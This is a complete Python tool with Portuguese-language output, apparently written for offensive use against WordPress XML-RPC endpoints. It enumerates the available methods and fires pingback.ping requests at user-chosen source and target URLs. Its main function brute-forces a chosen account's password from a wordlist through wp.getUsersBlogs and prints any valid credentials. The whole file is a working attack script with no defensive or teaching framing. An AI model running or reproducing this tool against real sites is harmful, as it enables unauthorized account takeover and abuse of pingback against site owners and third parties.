#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import xmlrpc.client
import http.client
import urllib.parse

def print_color(msg, color):
    codes = {
        'red':    '\033[91m',
        'green':  '\033[92m',
        'yellow': '\033[93m',
        'blue':   '\033[94m',
        'orange': '\033[33m',
    }
    reset = '\033[0m'
    print(f"{codes.get(color,'')}{msg}{reset}")

def say_hello(xmlrpc_url):
    try:
        client = xmlrpc.client.ServerProxy(xmlrpc_url)
        resp = client.demo.sayHello()
        print_color("sayHello OK", 'green')
        print(resp)
        return True
    except Exception as e:
        print_color(f"sayHello falhou: {e}", 'red')
        return False

def pingback(xmlrpc_url, source_url, target_url):
    parsed = urllib.parse.urlparse(xmlrpc_url)
    host = parsed.netloc
    path = parsed.path or '/xmlrpc.php'
    body = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>{source_url}</string></value></param>
    <param><value><string>{target_url}</string></value></param>
  </params>
</methodCall>"""
    try:
        conn = http.client.HTTPSConnection(host)
        conn.request("POST", path, body, {'Content-Type': 'text/xml'})
        res = conn.getresponse()
        data = res.read().decode('utf-8', errors='ignore')
        if res.status == 200 and 'faultCode' not in data:
            print_color("pingback OK", 'green')
            print_color("Resposta:", 'blue')
            print(data)
            return True
        else:
            print_color("pingback falhou", 'red')
            print(data)
            return False
    except Exception as e:
        print_color(f"Erro no pingback: {e}", 'red')
        return False

def list_methods(xmlrpc_url):
    try:
        client = xmlrpc.client.ServerProxy(xmlrpc_url)
        methods = client.system.listMethods()
        print_color("Métodos disponíveis:", 'green')
        for m in methods:
            print_color(f"- {m}", 'orange')
        return True
    except Exception as e:
        print_color(f"listMethods falhou: {e}", 'red')
        return False

def brute_login(xmlrpc_url, username, wordlist_path):
    if not os.path.isfile(wordlist_path):
        print_color("Wordlist não encontrada!", 'red')
        return False

    parsed = urllib.parse.urlparse(xmlrpc_url)
    host = parsed.netloc
    path = parsed.path or '/xmlrpc.php'

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                try:
                    client = xmlrpc.client.ServerProxy(xmlrpc_url)
                    blogs = client.wp.getUsersBlogs(username, pwd)
                    print_color(f"Login OK: {username}:{pwd}", 'green')
                    print(blogs)
                    return True
                except xmlrpc.client.Fault:
                    print_color(f"{username}:{pwd} → inválido", 'yellow')
                except Exception as e:
                    print_color(f"Erro ao testar {pwd}: {e}", 'red')
                    return False
        print_color("Nenhuma senha válida encontrada.", 'red')
        return False
    except Exception as e:
        print_color(f"Erro ao abrir wordlist: {e}", 'red')
        return False

def main():
    print_color("""
          __
 (\\,--------'()'--o
 (_    ___    /~""
  (_)_)  (_)_)
By M4Tr1XpDb
""", 'orange')
    print_color("Bem-vindo ao Valdivia, farejador de XML-RPC\n", 'orange')

    xmlrpc_url = input("Endpoint XML-RPC (ex: https://site.com/xmlrpc.php): ").strip()
    if not xmlrpc_url:
        print_color("URL inválida, abortando.", 'red')
        sys.exit(1)

    results = {}
    results['sayhello'] = say_hello(xmlrpc_url)

    source_url = input("\nURL de origem para pingback (ex: https://meu_blog/post): ").strip()
    target_url = input("URL de destino para pingback (ex: https://site.com): ").strip()
    results['pingback'] = pingback(xmlrpc_url, source_url, target_url)

    results['methods'] = list_methods(xmlrpc_url)

    username = input("\nUsuário para brute-force: ").strip()
    wordlist = input("Caminho completo da wordlist: ").strip()
    results['brute_login'] = brute_login(xmlrpc_url, username, wordlist)

    # Resumo final
    print_color("\n===== Resumo dos testes =====", 'blue')
    for name, ok in results.items():
        status = "SUCESSO" if ok else "FALHOU"
        color = 'green' if ok else 'red'
        print_color(f"{name:12} : {status}", color)

if __name__ == "__main__":
    main()
